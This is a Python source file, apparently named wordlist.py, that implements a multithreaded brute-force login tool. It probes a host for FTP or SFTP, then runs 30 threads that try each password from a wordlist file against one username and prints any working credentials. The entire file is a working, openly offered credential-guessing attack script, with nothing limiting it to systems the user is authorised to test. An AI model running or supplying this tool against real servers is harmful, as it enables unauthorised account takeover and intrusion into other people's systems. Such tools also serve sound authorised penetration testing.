import ftplib  # Import the ftplib module for FTP connections
import paramiko  # Import the paramiko module for SFTP connections
from threading import Thread, Event  # Import Thread and Event for multithreading
import queue  # Import queue for managing password attempts

def print_message(message):
    print(message)

def check_ftp(host, port):
    print_message('[!] Testing FTP connection')
    try:
        server = ftplib.FTP()  # Create an FTP object
        server.connect(host, port, timeout=5)  # Connect to the FTP server
        server.quit()  # Close the connection
        return True  # Return True if connection is successful
    except Exception as e:
        print_message(f"[X] FTP connection failed: {e}")  # Print the specific error
        return False

def check_sftp(host, port):
    print_message('[!] Testing SFTP connection')
    try:
        transport = paramiko.Transport((host, port))  # Create a transport object for SFTP
        transport.connect()  # Attempt to connect without username/password for testing
        transport.close()
        return True
    except Exception as e:
        print_message(f"[X] SFTP connection failed: {e}")  # Print the specific error
        return False

def connect_ftp(host, port, user, q, found_event):
    while not found_event.is_set():
        try:
            password = q.get_nowait()  # Get the next password from the queue
            server = ftplib.FTP()  # Create an FTP object
            server.connect(host, port, timeout=5)  # Connect to the FTP server
            server.login(user, password)  # Attempt to log in with the username and password
            print_message("[+] Found FTP credentials:")  # Print success message
            print_message(f"\tHost: {host}")  
            print_message(f"\tUser: {user}")
            print_message(f"\tPassword: {password}")
            found_event.set()  # Signal that credentials have been found
            with q.mutex:  # Lock the queue to clear it
                q.queue.clear()  # Clear the queue
                q.all_tasks_done.notify_all()  # Notify all tasks that are done
                q.unfinished_tasks = 0  # Reset unfinished tasks
            break  # Exit the loop after finding credentials
        except (ftplib.error_perm, queue.Empty):
            pass  # Ignore permission errors and empty queue
        except Exception as e:
            print_message(f"[X] Exception: {e}")
        finally:
            try:
                q.task_done()  # Mark the task as done
            except ValueError:
                pass  # Ignore ValueError if the queue is empty

def connect_sftp(host, port, user, q, found_event):
    while not found_event.is_set():
        try:
            password = q.get_nowait()  # Get the next password from the queue
            transport = paramiko.Transport((host, port))  # Create a transport object for SFTP
            transport.connect(username=user, password=password)  # Attempt to log in
            sftp = paramiko.SFTPClient.from_transport(transport)  # Create an SFTP client
            print_message("[+] Found SFTP credentials:")  # Print success message
            print_message(f"\tHost: {host}") 
            print_message(f"\tUser: {user}")  
            print_message(f"\tPassword: {password}")
            sftp.close()  # Close the SFTP client
            transport.close()  # Close the transport connection
            found_event.set()  # Signal that credentials have been found
            with q.mutex:  # Lock the queue to clear it
                q.queue.clear()  # Clear the queue
                q.all_tasks_done.notify_all()  # Notify all tasks that are done
                q.unfinished_tasks = 0  # Reset unfinished tasks
            break  # Exit the loop after finding credentials
        except (paramiko.AuthenticationException, queue.Empty):
            pass  # Ignore authentication errors and empty queue
        except Exception as e:
            print_message(f"[X] Exception: {e}")  # Print any other exceptions
        finally:
            try:
                q.task_done()  # Mark the task as done
            except ValueError:
                pass  # Ignore ValueError if the queue is empty

def wordlist_attack(host, port, user, wordlist_file):
    print(f"Host: {host}, Port: {port}, User: {user}")  # Debugging line
    # Determine the protocol
    protocol = None
    if check_ftp(host, port):  # Check if FTP is available
        protocol = 'ftp'  # Set protocol to FTP
    elif check_sftp(host, port):  # Check if SFTP is available
        protocol = 'sftp'  # Set protocol to SFTP
    else:
        print_message("Unable to determine the protocol. Please try again.")  # Print error message
        return  # Exit if no protocol is found

    # Read the wordlist of passwords
    try:
        with open(wordlist_file, 'r') as file:  # Open the wordlist file
            passwords = file.read().split("\n")  # Read passwords into a list
        print_message("[+] Reading provided wordlist")  # Print message indicating wordlist is being read
    except FileNotFoundError:
        print_message(f"[!] The file '{wordlist_file}' was not found. Exiting.")  # Print error message
        return  # Exit if the file is not found

    # Initialize the queue
    q = queue.Queue()  # Create a queue for passwords
    n_thread = 30  # Number of threads to spawn

    # Put all passwords into the queue
    for password in passwords:
        q.put(password)  # Add each password to the queue

    # Event to signal when credentials are found
    found_event = Event()  # Create an event for signaling

    # Print the wordlist attack start message once
    if protocol == 'ftp':
        print_message('[!] Starting FTP wordlist attack')  # Print start message for FTP
    elif protocol == 'sftp':
        print_message('[!] Starting SFTP wordlist attack')  # Print start message for SFTP

    # Create 'n_thread' that runs the appropriate function
    for t in range(n_thread):
        if protocol == 'ftp':
            thread = Thread(target=connect_ftp, args=(host, port, user, q, found_event))  # Create FTP thread
        elif protocol == 'sftp':
            thread = Thread(target=connect_sftp, args=(host, port, user, q, found_event))  # Create SFTP thread
        thread.daemon = True  # Set thread as a daemon
        thread.start()  # Start the thread

    # Wait for the queue to be empty or credentials to be found
    q.join()  # Block until all tasks in the queue are done

    # Check if credentials were found
    if found_event.is_set():
        print_message("[!] Wordlist attack completed. Credentials found.")
    else:
        print_message("[!] Wordlist attack completed. No credentials found.")

# Only run wordlist_attack if this script is executed directly
if __name__ == "__main__":
    import sys  # Import sys for command-line arguments
    if len(sys.argv) != 5:  # Check for correct number of arguments
        print("Usage: python wordlist.py <host> <port> <user> <wordlist_file>")  # Print usage message
        sys.exit(1)  # Exit if incorrect arguments
    host = sys.argv[1]  # Get host from command-line arguments
    port = int(sys.argv[2])  # Ensure this is an integer
    user = sys.argv[3]  # Get username from command-line arguments
    wordlist_file = sys.argv[4]  # Get wordlist file from command-line arguments
    wordlist_attack(host, port, user, wordlist_file)  # Start the wordlist attack